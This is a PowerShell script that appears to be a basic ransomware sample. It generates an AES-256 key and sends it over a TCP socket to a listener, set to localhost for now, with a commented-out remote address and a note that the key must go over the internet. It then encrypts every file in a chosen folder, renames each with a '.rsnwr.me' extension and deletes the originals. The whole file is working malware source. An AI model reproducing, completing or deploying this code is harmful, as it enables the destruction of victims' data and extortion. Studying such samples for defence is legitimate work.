function Send-Key($address, $port, $key)
{

    $sourcePort = Get-Random -Minimum 48000 -Maximum 53000
    $endpoint = New-Object System.Net.IPEndpoint([ipaddress]::any,$sourcePort)
    $client = [Net.Sockets.TCPClient]$endpoint

    $client.Connect("localhost", 6996)
    #$client.Connect($address, $port)
    $stream = $client.GetStream()

    $data = [System.Convert]::FromBase64String($key)

    $stream.Write($data, 0, $data.length)

    $client.Close()
    $client.Dispose()
}


function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }

    $aesManaged
}

function Create-AesKey() {
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
	
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-File($bytes, $key) {

    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()

    return $fullData
}


$key = Create-AesKey 
#$key | Out-File "key.txt" # encoded in base64 --> NEED TO SEND OVER INTERNET
Send-Key "localhost" 6996 $key



$files = Get-ChildItem -Path "PATH/TO/FOLDER/TO/ENCRYPT/DATA"


foreach ($file in $files)
{

    $fileName = $file.Name + ".rsnwr.me"
    $path = ($file.FullName).Replace(($file.Name), "")

    $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)

    $encryptedFile = Encrypt-File $fileBytes $key

    [System.IO.File]::WriteAllBytes(($path + $fileName),$encryptedFile)

    Remove-Item -Path $file.FullName
}
